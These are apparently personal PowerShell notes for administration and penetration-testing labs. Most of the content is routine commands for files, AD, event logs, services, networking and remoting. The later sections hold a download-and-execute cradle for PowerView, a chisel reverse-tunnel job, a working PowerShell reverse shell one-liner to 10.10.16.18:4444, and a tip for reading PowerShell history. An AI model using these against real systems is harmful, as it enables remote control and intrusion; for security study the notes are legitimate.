\section{Usefull commands}

\subsection{PowerShell history}
\begin{verbatim}
Get-Content 
    C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 
\end{verbatim}

\subsection{AD}
\begin{verbatim}
$ComputerName = 'DC01', 'WEB01'
foreach ($Computer in $ComputerName) {
  Get-ADComputer -Identity $Computer
}
\end{verbatim}

\subsection{Working with files}
\begin{verbatim}
Command 	    Alias 	            Description
Get-Item 	    gi 	                Retrieve an object (could be a file, folder, registry object, etc.)
Get-ChildItem 	ls / dir / gci 	    Lists out the content of a folder or registry hive.
New-Item 	    md / mkdir / ni 	Create new objects. ( can be files, folders, symlinks, registry entries, and more)
Set-Item 	    si 	                Modify the property values of an object.
Copy-Item 	    copy / cp / ci 	    Make a duplicate of the item.
Rename-Item 	ren / rni 	        Changes the object name.
Remove-Item 	rm / del / rmdir 	Deletes the object.
Get-Content 	cat / type 	        Displays the content within a file or object.
Add-Content 	ac 	                Append content to a file.
Set-Content 	sc 	                overwrite any content in a file with new data.
Clear-Content 	clc 	            Clear the content of the files without deleting the file itself.
Compare-Object 	diff / compare 	    Compare two or more objects against each other. This includes the object itself and the content within.
\end{verbatim}

\subsection{Event logs}
\begin{verbatim}
Get-WinEvent -ListLog *
Get-WinEvent -ListLog Security
Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message

# Logon Failures
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}

\end{verbatim}

\subsection{Working with services}

\begin{verbatim}
Get-Service | ft DisplayName,Status 
Start-Service WinDefend
Stop-Service Spooler
Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}
\end{verbatim}



\subsection{usefull network commands}
\begin{verbatim}
Cmdlet 	                Description
Get-NetIPInterface 	    Retrieve all visible network adapter properties.
Get-NetIPAddress 	    Retrieves the IP configurations of each adapter. Similar to IPConfig.
Get-NetNeighbor 	    Retrieves the neighbor entries from the cache. Similar to arp -a.
Get-Netroute 	        Will print the current route table. Similar to IPRoute.
Set-NetAdapter 	        Set basic adapter properties at the Layer-2 level such as VLAN id, description, and MAC-Address.
Set-NetIPInterface 	    Modifies the settings of an interface to include DHCP status, MTU, and other metrics.
Set-NetIPAddress 	    Modifies the configuration of a network adapter.
Disable-NetAdapter 	    Used to disable network adapter interfaces.
Enable-NetAdapter 	    Used to turn network adapters back on and allow network connections.
Restart-NetAdapter 	    Used to restart an adapter. It can be useful to help push changes made to adapter settings.
test-NetConnection 	    Allows for diagnostic checks to be ran on a connection. It supports ping, tcp, route tracing, and more.
\end{verbatim}

\subsection{usefull remoting commands}

\subsubsection{Launch remote command}
\begin{verbatim}
invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}
\end{verbatim}


\subsubsection{Enable remoting}
\begin{verbatim}
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
  Where{ $_.NetWorkCategory -ne 'Private'} |
  ForEach {
    $_
    $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
  }
\end{verbatim}

\subsubsection{List accessible computers}
 Get Computers list that curent user has access to:
\begin{verbatim}
$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }
\end{verbatim}

 Get Computers list that target user has access to:
\begin{verbatim}
$Username = 'domain\user'
$Password = ConvertTo-SecureString -AsPlainText 'password'-Force
$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$Password
$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
\end{verbatim}

 List endpoint that a group has access
\begin{verbatim}
Get-PSSessionConfiguration |where {$_.Permission -match 'Remote Management Users'}
\end{verbatim}

\subsubsection{Test remoting}
Tests whether the WinRM service is running on a local or remote computer
\begin{verbatim}
Test-WSMan -ComputerName "server01" -Authentication default
\end{verbatim}

\subsection{errors}
\begin{verbatim}
$error.Count
$error[0]
$error.Capacity
$MaximumErrorCount
\end{verbatim}

\subsection{Downloading}
\begin{verbatim}
Invoke-WebRequest -Uri "uri" -OutFile "f"
IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
\end{verbatim}



\subsection{Job}

\begin{verbatim}
$b = { Start-Process C:\Windows\Temp\chisel.exe -ArgumentList @('client','10.0.0.2:8080','R:127.0.0.1:33060:127.0.0.1:3306','R:127.0.0.1:8800:127.0.0.1:80') }
Start-Job -ScriptBlock $b

Get-Job 

Stop-Job -Id 1

\end{verbatim}




\subsection{Reverseshell}


\href{https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/}{Reverseshell builder}

\begin{verbatim}
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.18',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
\end{verbatim}

